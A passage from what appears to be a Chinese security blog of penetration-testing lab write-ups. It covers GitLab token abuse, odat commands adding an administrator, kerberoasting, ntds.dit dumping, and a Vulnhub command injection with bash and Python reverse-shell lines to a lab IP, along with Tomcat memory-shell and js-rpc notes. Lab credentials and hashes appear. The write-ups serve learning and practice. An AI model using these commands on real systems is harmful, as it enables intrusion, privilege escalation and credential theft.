class="hljs-attribute">glpat</span>-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2<br></code></pre></td></tr></table></figure><p>对gitlab有点陌生 跟着wp打</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">访问仓库接口<br>proxychains4 curl --silent --header <span class="hljs-string">&quot;PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2&quot;</span>  <span class="hljs-string">&quot;http://172.22.14.16/api/v4/projects/&quot;</span> | jq | grep <span class="hljs-string">&quot;http_url_to_repo&quot;</span><br>git下载仓库<br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/i</span>nternal-secret.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>xradmin.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>awenode.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/xrlab/</span>xrwiki.git <br>proxychains4 git clone http:<span class="hljs-regexp">//gi</span>tlab.xiaorang.lab:glpat-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2@<span class="hljs-number">172.22</span>.<span class="hljs-number">14.16</span><span class="hljs-regexp">/gitlab-instance-23352f48/</span>Monitoring.git<br></code></pre></td></tr></table></figure><p>找到oracle密码</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">master:</span><br><span class="hljs-symbol">url:</span> jdbc:oracle:thin:@<span class="hljs-number">172.22</span><span class="hljs-number">.14</span><span class="hljs-number">.31</span>:<span class="hljs-number">1521</span>/orcl<br><span class="hljs-symbol">username:</span> xradmin<br><span class="hljs-symbol">password:</span> fcMyE8t9E4XdsKf<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120151659060.png" alt="image-20241120151659060"></p><p>odat打 mdut一直执行不了命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 odat dbmsscheduler -s <span class="hljs-number">172.22</span>.<span class="hljs-number">14.31</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1521</span> -d ORCL -U xradmin -P fcMyE8t9E4XdsKf <span class="hljs-attr">--sysdba</span> <span class="hljs-attr">--exec</span> <span class="hljs-string">&#x27;net user qwq Qq123456. /add&#x27;</span><br>proxychains4 odat dbmsscheduler -s <span class="hljs-number">172.22</span>.<span class="hljs-number">14.31</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1521</span> -d ORCL -U xradmin -P fcMyE8t9E4XdsKf <span class="hljs-attr">--sysdba</span> <span class="hljs-attr">--exec</span> <span class="hljs-string">&#x27;net localgroup Administrators qwq /add&#x27;</span><br></code></pre></td></tr></table></figure><p>远程登录拿flag</p><p>还剩下一台成员机器 一台域控</p><p>利用刚刚找到的密码本</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120153357742.png" alt="image-20241120153357742"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120153504419.png" alt="image-20241120153504419"></p><p>XR-0923 | zhangshuai | wSbEajHzZs</p><p>(这个zhangshuai居然不是域用户,nxc和rdp都连了好久没通，nxc需要 –local-auth)</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120155015769.png" alt="image-20241120155015769"></p><p>发现该用户没有可利用的权限，想到利用winrm 5985端口</p><p><a href="https://forum.butian.net/share/2080">奇安信攻防社区-攻防技巧 | 域渗透中WinRM的技巧细节与利用</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120160119896.png" alt="image-20241120160119896"></p><p>SeRestorePrivilege利用</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8">渗透技巧——Windows九种权限的利用</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120161526677.png" alt="image-20241120161526677"></p><p>然后锁定用户 触发粘滞键</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120161559555.png" alt="image-20241120161559555"></p><p>跟着wp 后面mimikatz获得机器用户ntlm hash后打kerberoasting</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 GetUserSPNs<span class="hljs-selector-class">.py</span> xiaorang.lab/<span class="hljs-string">&#x27;XR-0923$&#x27;</span> -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">14.11</span><br><br>proxychains impacket-GetUserSPNs xiaorang.lab/<span class="hljs-string">&#x27;XR-0923$&#x27;</span> -hashes :b2caa4c3f6d5e97bf7c58f7db9e24317 -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">14.11</span> -request-user tianjing<br><br>hashcat -m <span class="hljs-number">13100</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span><br>得到<br>tianjing:DPQSXSXgh2<br></code></pre></td></tr></table></figure><p>用这个用户特权去打卷影拷贝</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241120164637570.png" alt="image-20241120164637570"></p><p><a href="https://cloud.tencent.com/developer/article/1752212">使用卷影拷贝服务提取 ntds.dit 的多种姿势-腾讯云开发者社区-腾讯云</a></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">创建raj.dsh<br><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias raj</span><br>create<br>expose <span class="hljs-comment">%raj% z:</span><br>编码<br>unix2dos <span class="hljs-comment">raj.dsh</span><br></code></pre></td></tr></table></figure><p>winrm连接靶机后</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss">diskshadow /s raj.dsh<br>RoboCopy /b z:\windows\ntds . ntds.dit<br>reg <span class="hljs-keyword">save</span> HKLM\<span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">system</span><br>download <span class="hljs-keyword">system</span><br>download ntds.dit<br>退出后<br>impacket-secretsdump -ntds ntds.dit -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure><p>#知识点</p><p>横向exec  非约束委派rubeus certify证书提权 fastjson log4j三种方式 GetNPUsers和Getuserspn区别</p><p>约束委派和基于资源的约束委派</p><p>fscan -h -p 1-65535 -nobr -nopoc -no</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241122165127294.png" alt="image-20241122165127294"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241122170246576.png" alt="image-20241122170246576"></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub</title>
    <link href="/2025/01/20/vulnhub/"/>
    <url>/2025/01/20/vulnhub/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>shift进入救援模式</p><p><a href="https://blog.csdn.net/zg_111/article/details/129810060">【Vulnhub】搭建Vulnhub靶机_vulnhub靶场搭建-CSDN博客</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ip a查看网卡名 <br>vim <span class="hljs-regexp">/etc/</span>network/interfaces修改为自己的网卡名<br>由于启动项，passwd root修改密码后重启即可<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/vulnhub/image-20250120153756792.png" alt="image-20250120153756792"></p><h1 id="boredhackerblog"><a href="#boredhackerblog" class="headerlink" title="boredhackerblog"></a>boredhackerblog</h1><p>先扫个8080出来</p><p><img src="/2025/01/20/vulnhub/image-20250120165718652.png" alt="image-20250120165718652">开局一个框 js啥都没有</p><p><img src="/2025/01/20/vulnhub/image-20250120165746715.png" alt="image-20250120165746715"></p><p>扫目录 控制台需要pin码</p><p>登录框不是万能密码，开始爆破</p><p>password进入</p><p><img src="/2025/01/20/vulnhub/image-20250120170442484.png" alt="image-20250120170442484"></p><p>怀疑rce 拼接whoami</p><p><img src="/2025/01/20/vulnhub/image-20250120170727401.png" alt="image-20250120170727401"></p><p>找flag太卡了 弹个shell</p><p><img src="/2025/01/20/vulnhub/image-20250120170929991.png" alt="image-20250120170929991"></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.230</span><span class="hljs-number">.129</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27;<br>/;python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.230.129&quot;</span>,<span class="hljs-number">4444</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/vulnhub/image-20250120171626066.png" alt="image-20250120171626066"></p><p>看提权 sudo -l不可用 尝试suid</p><p><img src="/2025/01/20/vulnhub/image-20250120172141105.png" alt="image-20250120172141105"></p><p>同目录下源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> *freshclam=<span class="hljs-string">&quot;/usr/bin/freshclam&quot;</span>;<br><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">char</span> *command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(freshclam) + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br><span class="hljs-built_in">sprintf</span>(command, <span class="hljs-string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(command);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个程序是root起的，直接用他拼接执行命令即可<img src="/2025/01/20/vulnhub/image-20250120172452476.png" alt="image-20250120172452476"></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存马</title>
    <link href="/2025/01/16/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/01/16/%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><img src="/2025/01/16/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250116152614890.png" class="" title="image-20250116152614890"><img src="/2025/01/16/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250116152929339.png" class="" title="image-20250116152929339"><ol><li>根据协议、端口找到连接器（如8080找到http连接器），连接器确认Service组件，Service组件又包含一个Engine</li><li>Mapper组件根据域名确认Host容器</li><li>Mapper根据url路径确认context容器</li><li>Mapper查询web.xml，根据Servlet映射确认具体的Wrapper和Servlet</li></ol><p>（Context是上下文，包含servlet运行环境，wrapper是包装器，负责管理一个servlet的装载、初始化等操作）</p><h2 id="tomcat加载"><a href="#tomcat加载" class="headerlink" title="tomcat加载"></a>tomcat加载</h2><img src="/2025/01/16/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250116153552099.png" class="" title="image-20250116153552099"><p>对于内存马，比较重要的是standardContext这个上下文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>......<br><br>    <span class="hljs-comment">// 遍历web.xml中的Context参数，并将它们添加到Context中</span><br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> webxml.getContextParams().entrySet().iterator();<br><span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : webxml.getContextParams().entrySet()) &#123;<br>            context.addParameter(entry.getKey(), entry.getValue());<br>    &#125;<br><br>......<br><br>    <span class="hljs-comment">// 添加Filter定义</span><br>    <span class="hljs-keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;<br>        <span class="hljs-keyword">if</span> (filter.getAsyncSupported() == <span class="hljs-literal">null</span>) &#123;<br>            filter.setAsyncSupported(<span class="hljs-string">&quot;false&quot;</span>);<br>        &#125;<br>        context.addFilterDef(filter);<br>    &#125;<br><br>    <span class="hljs-comment">// 添加Filter映射</span><br>    <span class="hljs-keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;<br>        context.addFilterMap(filterMap);<br>    &#125;<br><br>......<br><br>    <span class="hljs-comment">// 添加应用监听器</span><br>    <span class="hljs-keyword">for</span> (String listener : webxml.getListeners()) &#123;<br>        context.addApplicationListener(listener);<br>    &#125;<br><br>......<br><br>    <span class="hljs-comment">// 添加Servlet定义</span><br>    <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br>        <span class="hljs-comment">// Description is ignored</span><br>        <span class="hljs-comment">// Display name is ignored</span><br>        <span class="hljs-comment">// Icons are ignored</span><br><br>        <span class="hljs-comment">// jsp-file gets passed to the JSP Servlet as an init-param</span><br><br>        <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br>            wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>        &#125;<br>        <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>            wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>        &#125;<br>        wrapper.setName(servlet.getServletName());<br>        Map&lt;String,String&gt; params = servlet.getParameterMap();<br>        <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>            wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>        &#125;<br>        wrapper.setRunAs(servlet.getRunAs());<br>        Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>        <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>            wrapper.addSecurityReference(<br>                    roleRef.getName(), roleRef.getLink());<br>        &#125;<br>        wrapper.setServletClass(servlet.getServletClass());<br>        <span class="hljs-type">MultipartDef</span> <span class="hljs-variable">multipartdef</span> <span class="hljs-operator">=</span> servlet.getMultipartDef();<br>        <span class="hljs-keyword">if</span> (multipartdef != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">maxFileSize</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">maxRequestSize</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">fileSizeThreshold</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != multipartdef.getMaxFileSize()) &#123;<br>                maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != multipartdef.getMaxRequestSize()) &#123;<br>                maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;<br>                fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());<br>            &#125;<br><br>            wrapper.setMultipartConfigElement(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartConfigElement</span>(<br>                    multipartdef.getLocation(),<br>                    maxFileSize,<br>                    maxRequestSize,<br>                    fileSizeThreshold));<br>        &#125;<br>        <span class="hljs-keyword">if</span> (servlet.getAsyncSupported() != <span class="hljs-literal">null</span>) &#123;<br>            wrapper.setAsyncSupported(<br>                    servlet.getAsyncSupported().booleanValue());<br>        &#125;<br>        wrapper.setOverridable(servlet.isOverridable());<br>        context.addChild(wrapper);<br>    &#125;<br><br>    <span class="hljs-comment">// 添加Servlet映射</span><br><span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>            webxml.getServletMappings().entrySet()) &#123;<br>        context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>    &#125;<br>    <br>......<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p><a href="https://cmisl.github.io/2024/07/23/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/#Servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">JAVA内存马系列 - cmisl_破站</a></p><p><a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file">GitHub - W01fh4cker&#x2F;LearnJavaMemshellFromZero: 【三万字原创】完全零基础从0到1掌握Java内存马，公众号：追梦信安</a></p>]]></content>
    
    
    <categories>
      
      <category>内存马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js逆向</title>
    <link href="/2025/01/07/js%E9%80%86%E5%90%91/"/>
    <url>/2025/01/07/js%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>根据</p><p><a href="https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxIoxmg/FGCtK/feD">保姆级教程—前端加密的对抗（附带靶场） - 先知社区</a></p><p>下了旧版本的jstools</p><h1 id="当前数据包的修改（×）"><a href="#当前数据包的修改（×）" class="headerlink" title="当前数据包的修改（×）"></a>当前数据包的修改（×）</h1><p>利用js-forward</p><p>原理是通过http请求把未加密数据带到burp中自定义修改，然后放到镜像服务器加密后转发回原始服务器</p><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107162443780.png" class="" title="image-20250107162443780"><p>改了一下脚本 burp监听8081</p><p>文章说由于cors策略 chrome会报错，这里直接edge</p><p>在覆盖中填入脚本生成的js语句</p><img src="/2025/01/07/js%E9%80%86%E5%90%91/image-20250107162904452.png" class="" title="image-20250107162904452"><p>edge也报错cors了 试了一下但是没有解决</p><h1 id="js-rpc"><a href="#js-rpc" class="headerlink" title="js-rpc"></a>js-rpc</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Hlclient</span>(<span class="hljs-params">wsURL</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsURL</span> = wsURL;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span> = &#123;<br>        <span class="hljs-attr">_execjs</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, param</span>) &#123;<br>            <span class="hljs-keyword">var</span> res = <span class="hljs-built_in">eval</span>(param)<br>            <span class="hljs-keyword">if</span> (!res) &#123;<br>                <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&quot;没有返回值&quot;</span>)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_">resolve</span>(res)<br>            &#125;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span> = <span class="hljs-literal">undefined</span>;<br>    <span class="hljs-keyword">if</span> (!wsURL) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;wsURL can not be empty!!&#x27;</span>)<br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">connect</span>()<br>&#125;<br><br><span class="hljs-title class_">Hlclient</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">connect</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;begin of connect to wsURL: &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsURL</span>);<br>    <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">socket</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">wsURL</span>);<br>        <span class="hljs-variable language_">this</span>.<span 